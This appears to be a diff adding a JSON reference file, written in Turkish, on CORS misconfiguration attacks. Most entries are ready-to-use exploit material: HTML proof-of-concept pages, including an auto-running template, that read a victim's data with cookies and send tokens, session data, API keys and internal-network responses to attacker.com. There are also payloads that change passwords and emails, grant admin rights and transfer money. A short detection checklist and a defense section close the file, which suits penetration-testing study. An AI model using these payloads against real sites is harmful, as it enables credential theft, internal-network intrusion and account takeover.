@@ -1,0 +1,350 @@
+{
+  "cors_basics": {
+    "desc": "CORS (Cross-Origin Resource Sharing) temel bilgileri",
+    "category": "CORS",
+    "type": "Basics",
+    "risk": "Info",
+    "headers": {
+      "access_control_allow_origin": {
+        "desc": "Hangi origin'lerden isteklere izin verileceği",
+        "example": "Access-Control-Allow-Origin: https://trusted.com",
+        "wildcard": "Access-Control-Allow-Origin: *",
+        "note": "Wildcard (*) kullanımı tehlikeli olabilir"
+      },
+      "access_control_allow_credentials": {
+        "desc": "Cookie ve authentication bilgilerinin gönderilmesine izin ver",
+        "example": "Access-Control-Allow-Credentials: true",
+        "risk": "High if combined with weak origin validation"
+      },
+      "access_control_allow_methods": {
+        "desc": "İzin verilen HTTP metodları",
+        "example": "Access-Control-Allow-Methods: GET, POST, PUT, DELETE"
+      },
+      "access_control_allow_headers": {
+        "desc": "İzin verilen header'lar",
+        "example": "Access-Control-Allow-Headers: Content-Type, Authorization"
+      }
+    }
+  },
+
+  "cors_null_origin_bypass": {
+    "desc": "Null origin bypass - sandbox iframe'den exploitation",
+    "category": "CORS",
+    "type": "Null Origin Bypass",
+    "risk": "Critical",
+    "vulnerable_config": {
+      "response": "Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true",
+      "note": "Server 'null' origin'e güveniyorsa bypass edilebilir"
+    },
+    "exploitation": {
+      "html_poc": "<!DOCTYPE html>\n<html>\n<head><title>CORS Null Origin Exploit</title></head>\n<body>\n<iframe sandbox=\"allow-scripts\" srcdoc=\"\n  <script>\n    fetch('https://victim.com/api/user', {\n      credentials: 'include'\n    })\n    .then(response => response.json())\n    .then(data => {\n      // Veriyi attacker sunucusuna gönder\n      fetch('https://attacker.com/steal?data=' + JSON.stringify(data));\n    });\n  </script>\n\"></iframe>\n</body>\n</html>",
+      "how_it_works": "Sandbox iframe null origin oluşturur, server null'a güveniyorsa veri çalar"
+    },
+    "detection": {
+      "request": "Origin: null",
+      "vulnerable_response": "Access-Control-Allow-Origin: null\nAccess-Control-Allow-Credentials: true"
+    }
+  },
+
+  "cors_trusted_subdomain_bypass": {
+    "desc": "Trusted subdomain bypass - XSS ile CORS bypass",
+    "category": "CORS",
+    "type": "Subdomain Bypass",
+    "risk": "Critical",
+    "vulnerable_config": {
+      "desc": "Server tüm subdomain'lere güveniyor",
+      "regex": "if (origin.endsWith('.victim.com')) { allow(); }",
+      "note": "Subdomain'lerden birinde XSS varsa CORS bypass edilebilir"
+    },
+    "exploitation": {
+      "scenario": "1. subdomain.victim.com'da XSS bul\n2. XSS üzerinden main.victim.com'a istek at\n3. CORS izin verdiği için sensitive data çal",
+      "xss_payload": "<script>\nfetch('https://main.victim.com/api/sensitive-data', {\n  credentials: 'include'\n})\n.then(r => r.text())\n.then(data => {\n  navigator.sendBeacon('https://attacker.com/log', data);\n});\n</script>"
+    }
+  },
+
+  "cors_origin_reflection": {
+    "desc": "Origin reflection - server Origin header'ı aynen yansıtıyor",
+    "category": "CORS",
+    "type": "Origin Reflection",
+    "risk": "Critical",
+    "vulnerable_behavior": {
+      "desc": "Server gelen Origin'i validate etmeden yansıtıyor",
+      "request": "GET /api/user HTTP/1.1\nHost: victim.com\nOrigin: https://evil.com",
+      "vulnerable_response": "HTTP/1.1 200 OK\nAccess-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true"
+    },
+    "exploitation": {
+      "html_poc": "<!DOCTYPE html>\n<html>\n<head><title>CORS Origin Reflection Exploit</title></head>\n<body>\n<script>\nfetch('https://victim.com/api/user/profile', {\n  credentials: 'include'\n})\n.then(response => response.json())\n.then(data => {\n  // Veriyi attacker sunucusuna exfiltrate et\n  fetch('https://attacker.com/steal', {\n    method: 'POST',\n    body: JSON.stringify(data)\n  });\n  console.log('Stolen data:', data);\n});\n</script>\n</body>\n</html>",
+      "attack_flow": "1. Victim'i evil.com'a yönlendir\n2. evil.com, victim.com'a credentials ile istek atar\n3. victim.com Origin'i reflect eder ve credentials kabul eder\n4. Sensitive data çalınır"
+    }
+  },
+
+  "cors_prefix_bypass": {
+    "desc": "Origin prefix/suffix bypass - zayıf regex validation",
+    "category": "CORS",
+    "type": "Regex Bypass",
+    "risk": "High",
+    "vulnerable_patterns": {
+      "suffix_bypass": {
+        "desc": "Server sadece suffix kontrolü yapıyor",
+        "regex": "if (origin.endsWith('victim.com')) { allow(); }",
+        "bypass": "Origin: https://evilsite.victim.com\nOrigin: https://attackervictim.com"
+      },
+      "prefix_bypass": {
+        "desc": "Server sadece prefix kontrolü yapıyor",
+        "regex": "if (origin.startsWith('https://victim.com')) { allow(); }",
+        "bypass": "Origin: https://victim.com.evil.com"
+      },
+      "substring_bypass": {
+        "desc": "Server contains() kullanıyor",
+        "regex": "if (origin.contains('victim.com')) { allow(); }",
+        "bypass": "Origin: https://victim.com.evil.com\nOrigin: https://evilsite.com/victim.com"
+      }
+    },
+    "exploitation": {
+      "domain_setup": "attacker.com için subdomain oluştur: victim.com.attacker.com",
+      "poc": "<!DOCTYPE html>\n<html>\n<body>\n<script>\n// victim.com.attacker.com domain'inden istek at\nfetch('https://victim.com/api/data', {\n  credentials: 'include'\n})\n.then(r => r.json())\n.then(data => fetch('https://attacker.com/log?data=' + btoa(JSON.stringify(data))));\n</script>\n</body>\n</html>"
+    }
+  },
+
+  "cors_protocol_bypass": {
+    "desc": "Protocol bypass - null origin via file:// or data:",
+    "category": "CORS",
+    "type": "Protocol Bypass",
+    "risk": "High",
+    "techniques": {
+      "file_protocol": {
+        "desc": "file:// protocol ile null origin",
+        "html_file": "<!-- save as exploit.html -->\n<!DOCTYPE html>\n<html>\n<body>\n<script>\nfetch('https://victim.com/api/data', {\n  credentials: 'include'\n})\n.then(r => r.text())\n.then(data => {\n  // localStorage'a kaydet veya external service'e gönder\n  document.body.innerHTML = data;\n});\n</script>\n</body>\n</html>",
+        "usage": "Victim'e file://path/to/exploit.html linkini gönder"
+      },
+      "data_uri": {
+        "desc": "data: URI ile null origin",
+        "payload": "data:text/html,<script>fetch('https://victim.com/api',{credentials:'include'}).then(r=>r.text()).then(alert)</script>"
+      }
+    }
+  },
+
+  "cors_wildcard_with_credentials": {
+    "desc": "Wildcard with credentials - impossible but check for bugs",
+    "category": "CORS",
+    "type": "Wildcard Misconfiguration",
+    "risk": "Critical",
+    "note": "Spec'e göre '*' ve 'credentials:true' beraber kullanılamaz, ama bazı server implementation'lar bunu yanlış implement edebilir",
+    "vulnerable_response": {
+      "desc": "Hatalı implementation (spec'e aykırı)",
+      "headers": "Access-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true",
+      "browser_behavior": "Modern browser'lar bunu reject eder, ama eski veya custom client'lar kabul edebilir"
+    },
+    "test": {
+      "request": "curl -H 'Origin: https://evil.com' -v https://victim.com/api",
+      "check": "Hem wildcard hem credentials:true dönüyor mu kontrol et"
+    }
+  },
+
+  "cors_pre_domain_bypass": {
+    "desc": "Pre-domain bypass - attacker.com ile attackervictim.com",
+    "category": "CORS",
+    "type": "Pre-domain Bypass",
+    "risk": "Medium",
+    "vulnerable_regex": {
+      "desc": "Regex escape edilmemiş",
+      "code": "if (origin.match(/https://victim.com/)) { allow(); }",
+      "problem": "Regex'te '.' escape edilmemiş, herhangi bir karakter match eder"
+    },
+    "bypass_domains": [
+      "https://victimXcom",
+      "https://victim-com",
+      "https://victim_com",
+      "https://victim1com"
+    ],
+    "note": "Gerçekte bu domain'leri register etmek zor, ama bazı TLD'lerde mümkün olabilir"
+  },
+
+  "cors_cache_poisoning": {
+    "desc": "CORS cache poisoning - Vary header yanlış kullanımı",
+    "category": "CORS",
+    "type": "Cache Poisoning",
+    "risk": "High",
+    "vulnerability": {
+      "desc": "Server 'Vary: Origin' header'ı kullanmıyor",
+      "problem": "Cache, farklı origin'ler için aynı response'u döner"
+    },
+    "exploitation": {
+      "step1": {
+        "desc": "Attacker evil.com'dan istek atar",
+        "request": "GET /api/data HTTP/1.1\nHost: victim.com\nOrigin: https://evil.com",
+        "response": "Access-Control-Allow-Origin: https://evil.com\nCache-Control: public, max-age=3600"
+      },
+      "step2": {
+        "desc": "Legitimate user istek attığında cached evil.com origin döner",
+        "request": "GET /api/data HTTP/1.1\nHost: victim.com\nOrigin: https://victim.com",
+        "response": "Access-Control-Allow-Origin: https://evil.com (CACHED!)",
+        "impact": "User'ın browser'ı CORS error verir, DoS oluşur"
+      }
+    },
+    "mitigation": "Vary: Origin header'ı ekle"
+  },
+
+  "cors_intranet_access": {
+    "desc": "CORS ile internal network erişimi",
+    "category": "CORS",
+    "type": "Internal Network Access",
+    "risk": "Critical",
+    "scenario": {
+      "desc": "Public web app, internal API'lere güveniyor",
+      "vulnerable_config": "// Internal API\nAccess-Control-Allow-Origin: *\n// veya\nif (origin.contains('company.com')) { allow(); }"
+    },
+    "exploitation": {
+      "desc": "Victim company.com'da çalışıyor ve internal network'e erişimi var",
+      "attack_html": "<!DOCTYPE html>\n<html>\n<body>\n<script>\n// Internal service scan\nconst internalHosts = [\n  'http://192.168.1.1',\n  'http://10.0.0.1',\n  'http://172.16.0.1',\n  'http://internal-api.company.local'\n];\n\ninternalHosts.forEach(host => {\n  fetch(host + '/api/admin', {\n    credentials: 'include'\n  })\n  .then(r => r.text())\n  .then(data => {\n    fetch('https://attacker.com/exfil?host=' + btoa(host) + '&data=' + btoa(data));\n  })\n  .catch(err => console.log(host + ' not accessible'));\n});\n</script>\n</body>\n</html>",
+      "impact": "Internal API'lere external attacker erişebilir"
+    }
+  },
+
+  "cors_credential_theft": {
+    "desc": "CORS ile credential/token çalma",
+    "category": "CORS",
+    "type": "Credential Theft",
+    "risk": "Critical",
+    "attack_scenarios": [
+      {
+        "target": "JWT Token çalma",
+        "poc": "fetch('https://victim.com/api/user/token', {credentials:'include'})\n.then(r=>r.json())\n.then(data=>fetch('https://attacker.com/?jwt='+data.token))"
+      },
+      {
+        "target": "Session cookie çalma (HttpOnly değilse)",
+        "poc": "fetch('https://victim.com/api/session', {credentials:'include'})\n.then(r=>r.text())\n.then(session=>fetch('https://attacker.com/?s='+btoa(session)))"
+      },
+      {
+        "target": "API key çalma",
+        "poc": "fetch('https://victim.com/api/keys', {credentials:'include'})\n.then(r=>r.json())\n.then(keys=>navigator.sendBeacon('https://attacker.com/keys', JSON.stringify(keys)))"
+      },
+      {
+        "target": "User profile data çalma",
+        "poc": "fetch('https://victim.com/api/profile', {credentials:'include'})\n.then(r=>r.json())\n.then(profile=>{\n  fetch('https://attacker.com/steal', {\n    method: 'POST',\n    body: JSON.stringify(profile)\n  });\n})"
+      }
+    ]
+  },
+
+  "cors_mutation_attacks": {
+    "desc": "CORS ile state-changing operations (CSRF-like)",
+    "category": "CORS",
+    "type": "Mutation Attack",
+    "risk": "Critical",
+    "examples": [
+      {
+        "desc": "Password değiştirme",
+        "payload": "fetch('https://victim.com/api/user/password', {\n  method: 'POST',\n  credentials: 'include',\n  headers: {'Content-Type': 'application/json'},\n  body: JSON.stringify({newPassword: 'hacked123'})\n})"
+      },
+      {
+        "desc": "Email değiştirme",
+        "payload": "fetch('https://victim.com/api/user/email', {\n  method: 'PUT',\n  credentials: 'include',\n  body: JSON.stringify({email: 'attacker@evil.com'})\n})"
+      },
+      {
+        "desc": "Admin yetkisi verme",
+        "payload": "fetch('https://victim.com/api/admin/promote', {\n  method: 'POST',\n  credentials: 'include',\n  body: JSON.stringify({userId: 'attacker', role: 'admin'})\n})"
+      },
+      {
+        "desc": "Para transferi",
+        "payload": "fetch('https://victim.com/api/transfer', {\n  method: 'POST',\n  credentials: 'include',\n  body: JSON.stringify({to: 'attacker', amount: 10000})\n})"
+      }
+    ],
+    "note": "CORS misconfiguration + state-changing endpoint = CSRF bypass"
+  },
+
+  "cors_detection_checklist": {
+    "desc": "CORS misconfiguration tespit etme checklist",
+    "category": "CORS",
+    "type": "Detection",
+    "manual_tests": [
+      {
+        "test": "Arbitrary origin reflection",
+        "command": "curl -H 'Origin: https://evil.com' -I https://victim.com/api",
+        "check": "Access-Control-Allow-Origin: https://evil.com dönüyor mu?"
+      },
+      {
+        "test": "Null origin acceptance",
+        "command": "curl -H 'Origin: null' -I https://victim.com/api",
+        "check": "Access-Control-Allow-Origin: null + Allow-Credentials: true?"
+      },
+      {
+        "test": "Subdomain bypass",
+        "command": "curl -H 'Origin: https://evil.victim.com' -I https://victim.com/api",
+        "check": "Subdomain'e izin veriyor mu?"
+      },
+      {
+        "test": "Prefix/suffix bypass",
+        "command": "curl -H 'Origin: https://victim.com.evil.com' -I https://victim.com/api",
+        "check": "Zayıf regex validation var mı?"
+      },
+      {
+        "test": "Wildcard + credentials",
+        "command": "curl -H 'Origin: https://anything.com' -I https://victim.com/api",
+        "check": "ACAO: * ve credentials: true beraber mi?"
+      },
+      {
+        "test": "Protocol bypass",
+        "command": "curl -H 'Origin: file://' -I https://victim.com/api",
+        "check": "file:// veya data: protocol kabul ediliyor mu?"
+      }
+    ],
+    "automated_tools": [
+      "Burp Suite - Collaborator Client",
+      "CORScanner - python cors_scan.py -u https://victim.com",
+      "Corsy - python3 corsy.py -u https://victim.com",
+      "CORS-Scanner (Burp Extension)"
+    ]
+  },
+
+  "cors_exploitation_framework": {
+    "desc": "Full CORS exploitation PoC template",
+    "category": "CORS",
+    "type": "Exploitation",
+    "full_exploit_template": "<!DOCTYPE html>\n<html>\n<head>\n  <title>CORS Exploitation PoC</title>\n</head>\n<body>\n  <h1>CORS Misconfiguration Exploit</h1>\n  <div id=\"output\"></div>\n  \n  <script>\n  const API_ENDPOINT = 'https://victim.com/api/sensitive-data';\n  const EXFIL_SERVER = 'https://attacker.com/exfiltrate';\n  \n  async function exploitCORS() {\n    try {\n      // Step 1: Fetch sensitive data\n      const response = await fetch(API_ENDPOINT, {\n        method: 'GET',\n        credentials: 'include',\n        mode: 'cors'\n      });\n      \n      if (!response.ok) {\n        throw new Error('Request failed: ' + response.status);\n      }\n      \n      // Step 2: Extract data\n      const data = await response.json();\n      console.log('Stolen data:', data);\n      \n      // Step 3: Display locally (for testing)\n      document.getElementById('output').innerHTML = \n        '<pre>' + JSON.stringify(data, null, 2) + '</pre>';\n      \n      // Step 4: Exfiltrate to attacker server\n      await fetch(EXFIL_SERVER, {\n        method: 'POST',\n        headers: {'Content-Type': 'application/json'},\n        body: JSON.stringify({\n          victim: window.location.href,\n          timestamp: new Date().toISOString(),\n          stolen_data: data\n        })\n      });\n      \n      console.log('Data exfiltrated successfully');\n      \n    } catch (error) {\n      console.error('Exploit failed:', error);\n      document.getElementById('output').innerHTML = \n        '<p style=\"color:red\">Exploit failed: ' + error.message + '</p>';\n    }\n  }\n  \n  // Auto-execute on page load\n  window.onload = exploitCORS;\n  </script>\n</body>\n</html>",
+    "usage": "1. Victim'i bu sayfaya yönlendir\n2. CORS misconfiguration varsa veri çalınır\n3. Exfiltration server'da stolen data kontrol et"
+  },
+
+  "cors_defense": {
+    "desc": "CORS misconfiguration'dan korunma",
+    "category": "CORS",
+    "type": "Defense",
+    "best_practices": [
+      {
+        "rule": "Whitelist kullan",
+        "implementation": "const allowedOrigins = ['https://app1.victim.com', 'https://app2.victim.com'];\nif (allowedOrigins.includes(origin)) { allow(); }"
+      },
+      {
+        "rule": "Wildcard kullanma (credentials gerekiyorsa)",
+        "avoid": "Access-Control-Allow-Origin: *",
+        "use": "Access-Control-Allow-Origin: https://trusted-origin.com"
+      },
+      {
+        "rule": "null origin'e asla güvenme",
+        "check": "if (origin === 'null') { deny(); }"
+      },
+      {
+        "rule": "Regex validation dikkatli yap",
+        "bad": "if (origin.contains('victim.com')) { allow(); }",
+        "good": "if (origin === 'https://app.victim.com') { allow(); }"
+      },
+      {
+        "rule": "Vary: Origin header ekle",
+        "header": "Vary: Origin",
+        "reason": "Cache poisoning önlenir"
+      },
+      {
+        "rule": "Sensitive endpoint'lerde CORS disable et",
+        "note": "Admin panel, payment API gibi critical endpoint'lerde CORS'u kapat"
+      },
+      {
+        "rule": "Pre-flight istekleri validate et",
+        "check": "OPTIONS isteğinde de origin kontrolü yap"
+      }
+    ],
+    "secure_implementation": {
+      "nodejs": "const allowedOrigins = ['https://app.victim.com'];\napp.use((req, res, next) => {\n  const origin = req.headers.origin;\n  if (allowedOrigins.includes(origin)) {\n    res.setHeader('Access-Control-Allow-Origin', origin);\n    res.setHeader('Access-Control-Allow-Credentials', 'true');\n    res.setHeader('Vary', 'Origin');\n  }\n  next();\n});",
+      "php": "$allowedOrigins = ['https://app.victim.com'];\n$origin = $_SERVER['HTTP_ORIGIN'];\nif (in_array($origin, $allowedOrigins)) {\n  header('Access-Control-Allow-Origin: ' . $origin);\n  header('Access-Control-Allow-Credentials: true');\n  header('Vary: Origin');\n}",
+      "python_flask": "from flask_cors import CORS\nallowed_origins = ['https://app.victim.com']\nCORS(app, origins=allowed_origins, supports_credentials=True)"
+    }
+  }
+}
